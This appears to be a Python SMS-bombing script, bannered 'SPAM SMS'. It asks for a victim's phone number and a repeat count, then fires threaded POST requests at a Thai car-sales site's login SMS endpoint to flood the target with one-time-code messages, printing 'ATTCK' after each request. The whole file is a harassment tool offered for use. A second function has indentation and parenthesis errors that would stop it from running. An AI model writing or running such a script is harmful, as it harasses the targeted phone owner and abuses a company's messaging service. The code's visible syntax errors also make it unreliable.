import requests,sys,os,time,threading,json
from threading import Thread


os.system('clear')

print('')

print ('''
█▀▀ █▀▀█ █▀▀█ █▀▄▀█ 　 █▀▀ █▀▄▀█ █▀▀ 
▀▀█ █──█ █▄▄█ █─▀─█ 　 ▀▀█ █─▀─█ ▀▀█ 
▀▀▀ █▀▀▀ ▀──▀ ▀───▀ 　 ▀▀▀ ▀───▀ ▀▀▀''')


print('')

phone = input ("Enter Number : ")
print('')
jam = int(input ("Enter Amount : "))


def api1():
	requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
	print(f"ATTCK | {phone} | succeed")
	
	
 def api2():
     requests.post("https://www.carsome.co.th/website/login/sendSMS",data={"username":phone,"optType":0}
     print(f"ATTCK | {phone} | succeed")
	
	
for i in range (jam):
	threading.Thread(target=api1).start()
	threading.Thread(target=api2).start()